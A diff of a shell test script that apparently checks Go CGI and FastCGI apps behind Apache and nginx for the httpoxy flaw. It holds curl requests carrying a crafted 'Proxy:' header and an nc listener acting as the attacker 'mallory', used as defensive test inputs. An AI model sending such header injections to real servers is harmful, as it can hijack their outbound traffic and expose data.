@@ -26,11 +26,19 @@ if [ -z $TEST_PORT_FCGI ]; then
     TEST_PORT_FCGI=2082
 fi
 
+#GO=/usr/lib/go-tip/bin/go
+if [ -z $GO ]; then
+	GO=go
+fi
+
+echo "Go version:"
+$GO version
+
 echo "Building cgi"
-go build ./cmd/cgi &
+$GO build ./cmd/cgi &
 
 echo "Building fcgi"
-go build ./cmd/fcgi &
+$GO build ./cmd/fcgi &
 
 wait
 
@@ -75,7 +83,7 @@ echo "Testing: cgi/apache..."
 
 echo "" > ./cgi-mallory.log
 nc -v -l 12345 > ./cgi-mallory.log 2>&1 &
-sleep 1
+sleep 2
 curl -X GET -H "Proxy: $DOCKER_HOST_IP:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_CGI/httpoxy > ./cgi-curl.log 2>&1
 pkill -f 'nc -v -l 12345'
 echo "Testing done."
@@ -106,6 +114,7 @@ echo "Testing: fcgi/nginx"
 
 echo "" > ./fcgi-mallory.log
 nc -v -l 12345 > ./fcgi-mallory.log 2>&1 &
+sleep 2
 curl -vv -X GET -H "Proxy: $DOCKER_HOST_IP:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_FCGI/ > ./fcgi-curl.log 2>&1
 pkill -f 'nc -v -l 12345'
 echo "Testing done."
